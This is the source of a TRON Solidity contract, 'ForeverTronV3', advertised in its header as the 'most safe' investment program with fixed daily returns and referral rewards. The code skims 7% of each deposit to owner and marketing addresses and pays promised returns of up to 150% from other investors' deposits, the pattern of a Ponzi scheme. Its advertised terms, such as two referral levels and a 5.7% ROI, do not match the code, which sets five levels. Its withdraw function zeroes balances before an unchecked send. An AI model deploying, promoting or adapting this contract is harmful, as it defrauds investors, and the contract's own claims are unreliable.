//SourceUnit: ForeverTronV3.sol

pragma solidity ^0.4.25;

/**
* 
*   ,d8888b                                                    
*   88P'                                                       
*d888888P                                                      
*  ?88'     d8888b   88bd88b 
*  88P     d8P' ?88  88P'  
* d88      88b  d88 d88      
*d88'      `?8888P'd88' Ever Tron
*                                                         
*                                                        
* THE MOST SAFE AND STILL ATRACTIVE SMARTCONTRACT EVER
* 
* Crowdfunding And Investment Program: ROI 5.7% AND 10% 
* 5% + 4% Referral Rewards 2 Levels
* 
* ForeverTronV3 
* https://forevertronV2.io
* 
*
* 
**/
contract ForeverTronV3  {
  using SafeMath for uint;
  
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint MIN_DEPOSIT = 1 trx;
  uint START_AT = 22442985;
  
  address public owner;
  address public Marketing;

  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;

  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i ==1) {
            investors[rec].referrals_tier2++;
          }
      
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
    constructor(address _Marketing) public {
        owner = msg.sender;
        Marketing = _Marketing;
       
    tariffs.push(Tariff(25 * 28800, 150));
    tariffs.push(Tariff(12 * 28800, 120));
    tariffs.push(Tariff(1 * 28800, 100));
    
    for (uint i = 5; i >= 1; i--) {
      refRewards.push(i);
    }
  }
  
  function deposit(uint tariff, address referer) external payable {
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    
    register(referer);
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    
    owner.transfer(msg.value.mul(4).div(100));
    Marketing.transfer(msg.value.mul(3).div(100));

    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;

  }
  
  function withdraw() external {
    uint amount = profit();
    if (msg.sender.send(amount)) {
      investors[msg.sender].withdrawn += amount;
  
    emit Withdraw(msg.sender, amount);
    }
  }
  
  
  function deposit (address where) external payable {
    where.transfer(msg.value);
  }
}

library SafeMath {

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

}